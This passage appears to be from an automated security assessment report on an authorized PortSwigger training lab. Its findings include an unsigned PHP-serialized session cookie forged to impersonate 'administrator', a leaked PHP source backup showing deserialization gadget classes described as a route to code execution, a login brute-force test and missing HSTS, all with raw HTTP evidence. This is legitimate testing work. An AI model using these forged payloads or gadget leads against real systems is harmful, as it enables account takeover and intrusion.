                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating1.png">
                            $44.57
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating2.png">
                            $26.76
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/65.jpg">
                            <h3>Eco Boat</h3>
                            <img src="/resources/images/rating5.png">
                            $20.53
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $71.28
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating2.png">
                            $44.69
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating3.png">
                            $56.53
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating2.png">
                            $39.50
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/46.jpg">
                            <h3>Hitch A Lift</h3>
                            <img src="/resources/images/rating3.png">
                            $46.08
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating3.png">
                            $11.90
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [session] Insecure deserialization of session cookie — unsigned, forgeable PHP object identity

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/

On successful login, POST /login issues a `session` cookie that is a base64-encoded PHP serialized object with no signature/MAC: it decodes to `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dr458g7rz05zp9z18uhqs8lpbc57otq3";}` (evidence ev-mr62ppf2-6). The server base64-decodes and passes this attacker-controlled value straight to PHP `unserialize()` on authenticated routes, with no integrity protection — so identity (`username`) and the auth `access_token` live client-side and are fully forgeable/tamperable.

Proof the cookie reaches the deserializer: with NO cookie, GET /my-account cleanly 302-redirects to /login (ev-mr630vmm-h). When a crafted serialized `User` object is supplied as the cookie instead, the request reaches `unserialize()` and processing throws an unhandled HTTP 500 — reproduced twice, stably, with `username` forged to `administrator` and `access_token` set to the integer literal `0` (`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`) → 500, 3407-byte error page on both replays (ev-mr62x7ou-f, ev-mr62xbz6-g). A non-serialized garbage cookie likewise 500s on the failed `unserialize()` (ev-mr62vloq-9) rather than being treated as an invalid session, corroborating that the raw cookie is deserialized. The cookie is additionally `SameSite=None`, so it is sent on cross-site requests.

This is an OWASP A08 insecure-deserialization / PHP object-injection sink. It is RCE-class: a suitable POP gadget chain or PHAR payload would likely escalate to code execution or full account/admin takeover (tracked separately as a suspected RCE lead). Even absent a gadget, trusting an unsigned client-serialized object for authentication is broken authentication.

**Reproduction**

```
1. Log in with valid creds: POST /login `username=wiener&password=peter` → 302 /my-account, Set-Cookie `session=<base64>` (ev-mr62ppf2-6).
2. base64-decode the cookie → `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"...";}` (a PHP serialized object, not an opaque token).
3. Negative control: GET /my-account with no cookie → 302 /login (ev-mr630vmm-h) — deserialization path not taken.
4. Craft a serialized object, e.g. `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`, base64-encode, set it as the `session` cookie, GET /my-account → HTTP 500 unhandled `unserialize()` error, reproduced identically twice (ev-mr62x7ou-f, ev-mr62xbz6-g). This proves the server deserializes attacker-controlled bytes.
```

**Evidence**

- Evidence `ev-mr630vmm-h` — `artifacts/s-0002/ev-mr630vmm-h/`

Request:

```http
GET /my-account HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 302
content-length: 0
location: /login
set-cookie: <redacted>
x-frame-options: SAMEORIGIN
```

- Evidence `ev-mr62x7ou-f` — `artifacts/s-0002/ev-mr62x7ou-f/`

Request:

```http
GET /my-account HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 500
content-length: 3407
content-type: text/html; charset=utf-8
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                    </header>
                    <h4>Internal Server Error</h4>
                    <p class=is-warning>PHP Fatal error:  Uncaught Exception: Invalid user administrator in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7</p>
                </div>
            </section>
        </div>
    </body>
</html>
```

- Evidence `ev-mr62xbz6-g` — `artifacts/s-0002/ev-mr62xbz6-g/`

Request:

```http
GET /my-account HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 500
content-length: 3407
content-type: text/html; charset=utf-8
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                    </header>
                    <h4>Internal Server Error</h4>
                    <p class=is-warning>PHP Fatal error:  Uncaught Exception: Invalid user administrator in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7</p>
                </div>
            </section>
        </div>
    </body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [info-disclosure] PHP source code disclosure via editor backup (~) at /cgi-bin/libs/CustomTemplate.php~

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/

An editor/backup copy of a server-side PHP source file is served at /cgi-bin/libs/CustomTemplate.php~ (HTTP 200, Content-Type text/plain). It discloses the full source of the CustomTemplate, Product, Description and DefaultMap classes, including magic methods __wakeup and __get and a call_user_func($this->callback, $name) sink. This is exactly the information needed to construct a custom deserialization gadget chain against the serialization-based session mechanism, and directly enables the RCE finding. A non-existent sibling backup returns the app JSON 404, proving the leak is specific to the real file, not a catch-all.

**Reproduction**

```
GET /cgi-bin/libs/CustomTemplate.php~ -> 200 text/plain; body starts "<?php class CustomTemplate {" and reveals DefaultMap::__get -> call_user_func($this->callback, $name). Negative control GET /cgi-bin/libs/NonExistent.php~ -> 404 "Not Found".
```

**Evidence**

- Evidence `ev-mr656d6a-2d` — `artifacts/_/ev-mr656d6a-2d/`

Request:

```http
GET /cgi-bin/libs/NonExistent.php~ HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 11
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

"Not Found"
```

- Evidence `ev-mr64wpmk-2c` — `artifacts/_/ev-mr64wpmk-2c/`

Request:

```http
GET /cgi-bin/libs/CustomTemplate.php~ HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1396
content-type: text/plain
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

- Evidence `ev-mr656hg3-2e` — `artifacts/_/ev-mr656hg3-2e/`

Request:

```http
GET /cgi-bin/libs/CustomTemplate.php~ HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1396
content-type: text/plain
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

<a id="finding-4"></a>

### 4. [LOW] [rate-limit] No brute-force protection / rate limiting on login

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/

POST /login enforces no rate limiting, account lockout, or CAPTCHA. Roughly a dozen consecutive failed login attempts for user `wiener` (and other usernames) were all processed and returned the normal 200 "invalid credentials" page — no 429, no temporary lockout, no CAPTCHA challenge ever appeared. The endpoint clearly differentiates outcomes (valid creds → 302 redirect with a session; invalid → 200 error page), so the sustained 200 responses across the failure burst represent genuinely processed attempts, not a catch-all. This permits unrestricted online password brute-forcing / credential stuffing against any known username. Severity is Low in isolation; it compounds the impact of any weak/guessable password.

**Reproduction**

```
1. Negative control (endpoint is not a catch-all): POST /login `username=wiener&password=peter` → 302 + session cookie (ev-mr62ppf2-6).
2. Send many rapid failed logins: POST /login `username=wiener&password=bad1..bad6` (and earlier attempts) — every one returns 200, 4160-byte error page, no throttling (ev-mr639u9c-12, ev-mr63a2tk-14, among ~12 total).
3. Observe: no 429/lockout/CAPTCHA after a dozen consecutive failures → brute-force protection absent.
```

**Evidence**

- Evidence `ev-mr62ppf2-6` — `artifacts/s-0002/ev-mr62ppf2-6/`

Request:

```http
POST /login HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=wiener&password=peter
```

Response:

```http
HTTP/1.1 302
content-length: 0
location: /my-account?id=wiener
set-cookie: <redacted>
x-frame-options: SAMEORIGIN
```

- Evidence `ev-mr639u9c-12` — `artifacts/s-0002/ev-mr639u9c-12/`

Request:

```http
POST /login HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=wiener&password=bad4
```

Response:

```http
HTTP/1.1 200
content-length: 4160
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Invalid username or password.</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                    <!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr63a2tk-14` — `artifacts/s-0002/ev-mr63a2tk-14/`

Request:

```http
POST /login HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=wiener&password=bad6
```

Response:

```http
HTTP/1.1 200
content-length: 4160
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Invalid username or password.</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                    <!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-5"></a>

### 5. [LOW] [burp] Strict transport security not enforced (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) [+1 more URL(s): https://0a14001003ba06e480069a13001b0048.web-security-academy.net/product] @ https://0a14001003ba06e480069a13001b0048.web-security-academy.net/login

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr661nys-30` — `artifacts/_/ev-mr661nys-30/`

Request:

```http
GET /login HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net

GET /login HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6903

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
